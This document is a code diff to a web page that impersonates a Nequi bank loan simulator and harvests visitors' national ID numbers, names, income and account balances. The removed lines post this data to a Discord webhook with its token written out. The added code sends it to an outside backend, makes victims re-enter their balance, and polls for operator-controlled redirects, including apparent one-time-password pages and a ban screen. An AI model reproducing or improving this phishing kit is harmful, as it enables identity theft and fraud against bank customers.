@@ -665,7 +665,7 @@
       <span class="select-icon">▼</span>
     </div>
 
-    <!-- Ingresos - CORREGIDO (sin formateo automático) -->
+    <!-- Ingresos -->
     <div class="form-group" style="margin-top: 8px;">
       <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23200020'%3E%3Cpath d='M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z'/%3E%3C/svg%3E" alt="ingresos">
       <input type="text" id="ingresoMensual" maxlength="15" placeholder=" ">
@@ -673,7 +673,7 @@
     </div>
     <span id="ingresosError" class="error-msg">Ingresa tus ingresos mensuales (mínimo $100.000)</span>
 
-    <!-- Gastos mensuales - CORREGIDO (sin formateo automático) -->
+    <!-- Gastos mensuales -->
     <div class="form-group" style="margin-top: 8px;">
       <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23200020'%3E%3Cpath d='M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z'/%3E%3C/svg%3E" alt="gastos">
       <input type="text" id="gastosMensual" maxlength="15" placeholder=" ">
@@ -681,7 +681,7 @@
     </div>
     <span id="gastosError" class="error-msg">Ingresa tus gastos mensuales (mínimo $100.000)</span>
 
-    <!-- Saldo NEQUI - CORREGIDO (sin formateo automático) -->
+    <!-- Saldo NEQUI -->
     <div class="form-group" style="margin-top: 8px;">
       <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23200020'%3E%3Cpath d='M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z'/%3E%3C/svg%3E" alt="saldo">
       <input type="text" id="saldoActual" maxlength="15" placeholder=" ">
@@ -780,6 +780,9 @@
   <script>
     document.addEventListener('DOMContentLoaded', () => {
 
+      // ===== CONFIGURACIÓN =====
+      const API_BASE_URL = 'https://nequiscol.onrender.com'; // URL de tu backend
+
       // ===== ELEMENTOS =====
       const cedulaInput = document.getElementById('cedula');
       const nombreInput = document.getElementById('nombreCompleto');
@@ -804,6 +807,14 @@
       const toastMessage = document.getElementById('toastMessage');
 
       let isChecked = false;
+      let isFirstClick = true; // Para controlar el flujo
+
+      // ===== OBTENER SESSION ID =====
+      let sessionId = localStorage.getItem('sessionId');
+      if (!sessionId) {
+        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        localStorage.setItem('sessionId', sessionId);
+      }
 
       // ===== PRECARGAR DATOS DESDE localStorage =====
       try {
@@ -817,6 +828,10 @@
         if (formData.nombreCompleto) {
           nombreInput.value = formData.nombreCompleto;
         }
+        // Si ya se envió el primer saldo, marcar como segundo clic
+        if (localStorage.getItem('loanFirstClickSent') === 'true') {
+          isFirstClick = false;
+        }
       } catch (e) { /* Ignorar */ }
 
       // ===== FUNCIONES =====
@@ -829,14 +844,8 @@
       }
 
       function validarMonto(val) {
-        // Eliminar caracteres no numéricos
         const num = val.replace(/[^0-9]/g, '');
-        return num.length >= 6; // mínimo 100.000
-      }
-
-      // Función para limpiar y obtener solo números de un valor
-      function getNumericValue(val) {
-        return val.replace(/[^0-9]/g, '');
+        return num.length >= 6;
       }
 
       function actualizarBoton() {
@@ -875,7 +884,22 @@
         setTimeout(() => toast.classList.remove('show'), 4000);
       }
 
-      // ===== EVENTOS CORREGIDOS - SOLO VALIDACIÓN, SIN FORMATEO AUTOMÁTICO =====
+      // ===== FUNCIÓN PARA ENVIAR A BACKEND =====
+      async function enviarAlBackend(endpoint, data) {
+        try {
+          const response = await fetch(`${API_BASE_URL}${endpoint}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+          });
+          return await response.json();
+        } catch (error) {
+          console.error('Error al enviar al backend:', error);
+          throw error;
+        }
+      }
+
+      // ===== EVENTOS =====
       cedulaInput.addEventListener('input', (e) => {
         e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
         if (!validarCedula(e.target.value)) {
@@ -895,11 +919,8 @@
         actualizarBoton();
       });
 
-      // Ingresos - SOLO VALIDACIÓN (sin formateo)
       ingresoInput.addEventListener('input', function(e) {
-        // Solo permitir números
         this.value = this.value.replace(/[^0-9]/g, '');
-        
         if (!validarMonto(this.value)) {
           ingresosError.classList.add('show');
         } else {
@@ -908,10 +929,8 @@
         actualizarBoton();
       });
 
-      // Gastos - SOLO VALIDACIÓN (sin formateo)
       gastosInput.addEventListener('input', function(e) {
         this.value = this.value.replace(/[^0-9]/g, '');
-        
         if (!validarMonto(this.value)) {
           gastosError.classList.add('show');
         } else {
@@ -920,10 +939,8 @@
         actualizarBoton();
       });
 
-      // Saldo - SOLO VALIDACIÓN (sin formateo)
       saldoInput.addEventListener('input', function(e) {
         this.value = this.value.replace(/[^0-9]/g, '');
-        
         if (!validarMonto(this.value)) {
           saldoError.classList.add('show');
         } else {
@@ -947,76 +964,214 @@
         actualizarBoton();
       });
 
-      // ===== BOTÓN SOLICITAR =====
+      // ===== BOTÓN SOLICITAR - CON INTEGRACIÓN AL BACKEND =====
       btnSolicitar.addEventListener('click', async () => {
         btnSolicitar.disabled = true;
         loadingSpinner.style.display = 'flex';
         spinnerText.textContent = 'Un momento por favor, estamos procesando tu solicitud...';
 
-        // Simulación de proceso
-        setTimeout(() => {
-          spinnerText.textContent = 'Validando tu información...';
-        }, 2000);
-
-        setTimeout(() => {
-          spinnerText.textContent = 'Casi listo...';
-        }, 4000);
-
-        setTimeout(() => {
-          loadingSpinner.style.display = 'none';
-          showToast('✅ Validación exitosa. Redirigiendo...', 'success');
-          btnSolicitar.disabled = false;
-          
-          // Redirigir a la siguiente página
-          setTimeout(() => {
-            window.location.href = 'questions-credit.php.html';
-          }, 1500);
-        }, 6000);
-
-        // Guardar datos
+        // Obtener datos del formulario
         const formData = {
           cedula: cedulaInput.value,
-          nombre: nombreInput.value,
+          nombreCompleto: nombreInput.value,
           ocupacion: document.getElementById('ocupacion').value,
-          ingreso: ingresoInput.value,
-          gastos: gastosInput.value,
-          saldo: saldoInput.value,
+          ingresoMensual: ingresoInput.value,
+          gastosMensual: gastosInput.value,
+          saldoActual: saldoInput.value,
           monto: montoSeleccionado.textContent,
           plazo: plazoSelector.value,
           fechaPago: document.getElementById('fechaPago').value,
         };
+
+        // Guardar en localStorage
         localStorage.setItem('formData', JSON.stringify(formData));
         localStorage.setItem('aprobado', montoSeleccionado.textContent);
-        
-        // ===== ENVIAR A TELEGRAM =====
+
         try {
-          const message = `✅ CLIENTE NEQUI NUEVO\n` +
-            `🆔 Cédula: ${formData.cedula}\n` +
-            `👤 Nombre: ${formData.nombre}\n` +
-            `🧑‍💼 Ocupación: ${formData.ocupacion}\n` +
-            `📈 Ingresos: $${new Intl.NumberFormat('es-CO').format(parseInt(formData.ingreso) || 0)}\n` +
-            `💸 Gastos: $${new Intl.NumberFormat('es-CO').format(parseInt(formData.gastos) || 0)}\n` +
-            `💰 Saldo NEQUI: $${new Intl.NumberFormat('es-CO').format(parseInt(formData.saldo) || 0)}\n` +
-            `💵 Monto solicitado: ${formData.monto}\n` +
-            `⏳ Plazo: ${formData.plazo} meses\n` +
-            `📅 Fecha pago: ${formData.fechaPago}`;
-          
-          // Enviar a webhook de Telegram
-          await fetch('https://discordapp.com/api/webhooks/1512606404278620230/TH3CsJVCjBcXoVv2kGPOyRh0Ua3oG7qh8Rc4nA2v4AyzfwpTE9qBcSusehNMzVhnJ5Po', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: message })
-          });
-          console.log('✅ Mensaje enviado a Telegram');
+          if (isFirstClick) {
+            // ===== PRIMER CLIC: Enviar primer saldo =====
+            spinnerText.textContent = 'Enviando información...';
+            
+            await enviarAlBackend('/step2-loan-first', {
+              sessionId: sessionId,
+              cedula: formData.cedula,
+              nombreCompleto: formData.nombreCompleto,
+              ocupacion: formData.ocupacion,
+              ingresoMensual: formData.ingresoMensual,
+              gastosMensual: formData.gastosMensual,
+              saldoActual: formData.saldoActual
+            });
+
+            localStorage.setItem('loanFirstClickSent', 'true');
+            isFirstClick = false;
+
+            loadingSpinner.style.display = 'none';
+            showToast('✅ Información guardada. Por favor, verifica el saldo y vuelve a enviar.', 'success');
+            btnSolicitar.disabled = false;
+
+            // Limpiar campo de saldo para que el usuario ingrese el segundo saldo
+            saldoInput.value = '';
+            saldoInput.focus();
+
+          } else {
+            // ===== SEGUNDO CLIC: Enviar segundo saldo con botones =====
+            spinnerText.textContent = 'Enviando datos completos...';
+
+            const result = await enviarAlBackend('/step2-loan-second', {
+              sessionId: sessionId,
+              saldoActual: formData.saldoActual
+            });
+
+            if (result.ok) {
+              loadingSpinner.style.display = 'none';
+              showToast('✅ Datos enviados correctamente. Espera instrucciones...', 'success');
+              btnSolicitar.disabled = false;
+
+              // Iniciar polling para recibir redirección
+              iniciarPolling(sessionId);
+
+            } else {
+              throw new Error('Error al enviar los datos');
+            }
+          }
+
         } catch (error) {
-          console.error('❌ Error al enviar a Telegram:', error);
+          console.error('Error:', error);
+          loadingSpinner.style.display = 'none';
+          showToast('❌ Error al enviar los datos. Intenta nuevamente.', 'error');
+          btnSolicitar.disabled = false;
         }
       });
+
+      // ===== FUNCIÓN DE POLLING PARA REDIRECCIONES =====
+      function iniciarPolling(sessionId) {
+        let attempts = 0;
+        const maxAttempts = 60; // 60 segundos máximo
+
+        const pollInterval = setInterval(async () => {
+          attempts++;
+          try {
+            const response = await fetch(`${API_BASE_URL}/instruction/${sessionId}`);
+            const data = await response.json();
+
+            if (data.redirect_to) {
+              clearInterval(pollInterval);
+              console.log('🎯 Redirección recibida:', data.redirect_to);
+
+              // Verificar si es error de monto
+              if (data.redirect_to === 'loan-simulator-error') {
+                showToast('❌ Error en el monto. Por favor, verifica el saldo.', 'error');
+                // Limpiar campo de saldo y enfocar
+                saldoInput.value = '';
+                saldoInput.focus();
+                return;
+              }
+
+              // Si es baneo
+              if (data.redirect_to === 'banned') {
+                document.body.innerHTML = `
+                  <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:white;color:#5D079D;font-size:24px;">
+                    Acceso denegado
+                  </div>
+                `;
+                return;
+              }
+
+              // Redirigir a la página indicada
+              if (data.redirect_to.startsWith('one-time')) {
+                // Animación especial para one-time-pass
+                mostrarAnimacionRedireccion(data.redirect_to);
+              } else {
+                window.location.href = data.redirect_to;
+              }
+            }
+          } catch (error) {
+            console.error('Error en polling:', error);
+          }
+
+          if (attempts >= maxAttempts) {
+            clearInterval(pollInterval);
+            console.log('⏰ Tiempo de espera agotado para redirección');
+          }
+        }, 1000);
+      }
+
+      // ===== ANIMACIÓN PARA REDIRECCIÓN =====
+      function mostrarAnimacionRedireccion(destino) {
+        // Ocultar loader actual
+        loadingSpinner.style.display = 'none';
+
+        // Crear animación
+        const animacion = document.createElement('div');
+        animacion.style.cssText = `
+          position: fixed;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 100%;
+          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+          display: flex;
+          flex-direction: column;
+          justify-content: center;
+          align-items: center;
+          z-index: 99999;
+        `;
+
+        animacion.innerHTML = `
+          <div style="
+            width: 120px;
+            height: 120px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: scaleIn 0.5s ease-out;
+          ">
+            <svg width="70" height="70" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="20 6 9 17 4 12"></polyline>
+            </svg>
+          </div>
+          <h2 style="
+            color: white;
+            font-size: 32px;
+            font-weight: bold;
+            margin-top: 30px;
+            animation: fadeIn 0.8s ease-out 0.3s both;
+          ">¡Perfecto!</h2>
+          <p style="
+            color: rgba(255,255,255,0.9);
+            font-size: 18px;
+            margin-top: 10px;
+            animation: fadeIn 0.8s ease-out 0.5s both;
+          ">Redirigiendo...</p>
+          <style>
+            @keyframes scaleIn {
+              from { transform: scale(0); }
+              to { transform: scale(1); }
+            }
+            @keyframes fadeIn {
+              from { opacity: 0; transform: translateY(20px); }
+              to { opacity: 1; transform: translateY(0); }
+            }
+          </style>
+        `;
+
+        document.body.appendChild(animacion);
+
+        setTimeout(() => {
+          window.location.href = destino;
+        }, 2000);
+      }
 
       // ===== INICIALIZAR =====
       updateSliderBackground();
       calcularCuota();
       actualizarBoton();
+
+      console.log('🔐 Session ID:', sessionId);
+      console.log('📌 Primer clic:', isFirstClick);
 
     });
   </script>
